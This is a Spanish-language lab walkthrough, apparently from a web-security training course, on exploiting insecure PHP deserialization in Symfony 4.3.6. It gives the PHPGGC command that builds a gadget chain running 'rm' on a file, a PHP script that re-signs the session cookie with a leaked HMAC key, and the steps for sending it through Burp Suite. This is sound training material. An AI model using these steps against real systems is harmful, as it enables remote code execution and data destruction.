# 6. Deserialización PHP con Gadget Predefinido

## 🧬 Deserialización PHP con gadget predefinido

### 📄 Descripción del laboratorio

Este laboratorio utiliza **serialización PHP para gestionar la sesión**, almacenando el objeto serializado dentro de una **cookie firmada con HMAC-SHA1**.

La cookie contiene un objeto serializado codificado en Base64 y una firma criptográfica que garantiza su integridad.

Si el atacante consigue la **clave secreta utilizada para generar el HMAC**, puede modificar el contenido de la cookie, recalcular la firma y enviar un objeto malicioso.

🎯 **Objetivo del laboratorio:**

* Generar una cookie firmada válida
* Inyectar un objeto serializado malicioso
* Ejecutar un comando que elimine el archivo:

```
/home/carlos/morale.txt
```

Credenciales iniciales:

```
wiener : peter
```

***

### 📚 Teoría

Este laboratorio combina dos elementos de seguridad que, mal implementados, siguen siendo explotables:

```
serialización PHP insegura
firma criptográfica basada en HMAC
```

#### 📌 Formato de la cookie de sesión

La cookie contiene un objeto JSON con dos campos:

```
{
  "token": "BASE64_SERIALIZED_OBJECT",
  "sig_hmac_sha1": "HMAC_SIGNATURE"
}
```

Donde:

```
token          → objeto PHP serializado codificado en Base64
sig_hmac_sha1  → HMAC-SHA1 calculado sobre el token
```

El backend realiza una validación similar a:

```
if (hash_hmac('sha1', $token, $secretKey) === $sig) {
    unserialize(base64_decode($token));
}
```

La firma garantiza **integridad**, pero no evita que el contenido sea peligroso.

Si un atacante obtiene la **secret key**, puede:

```
modificar el token
recalcular la firma
enviar un objeto malicioso válido
```

#### 📌 Gadget chains en frameworks PHP

El laboratorio utiliza **Symfony 4.3.6**.

Muchos frameworks incluyen clases con **métodos mágicos peligrosos**:

```
__destruct
__wakeup
__toString
```

Estas clases pueden combinarse para formar **gadget chains** que ejecutan comandos durante la deserialización.

La herramienta **PHPGGC** permite generar automáticamente estas cadenas.

#### 3️⃣ Generar el gadget chain

Descargamos **PHPGGC**.

Listamos los gadgets disponibles para Symfony:

```
./phpggc -l | grep Symfony
```

Seleccionamos un gadget compatible con Symfony 4, por ejemplo:

```
Symfony/RCE4
```

Generamos el payload que ejecutará el comando:

```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

La salida es un objeto serializado malicioso codificado en Base64.

***

#### 4️⃣ Firmar la cookie

Necesitamos generar una firma válida usando la secret key.

Ejemplo de script PHP:

```
<?php
$token = "BASE64_PAYLOAD_GENERADO";
$secretKey = "SECRET_KEY_FILTRADA";

$sig = hash_hmac('sha1', $token, $secretKey);

$cookie = '{"token":"' . $token . '","sig_hmac_sha1":"' . $sig . '"}';

echo urlencode($cookie);
?>
```

Ejecutamos el script para generar la cookie final.

***

#### 5️⃣ Enviar la cookie maliciosa

Interceptamos una petición con **Burp Suite**.

Reemplazamos la cookie original por la nueva cookie generada.

Enviamos la petición.

<figure><img src="../../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>

En el backend ocurre:

```
1. Se decodifica el JSON
2. Se verifica el HMAC
3. Se decodifica el token Base64
4. Se ejecuta unserialize()
```

Durante la deserialización se ejecuta el gadget chain generado.

Esto provoca la ejecución del comando:

```
rm /home/carlos/morale.txt
```
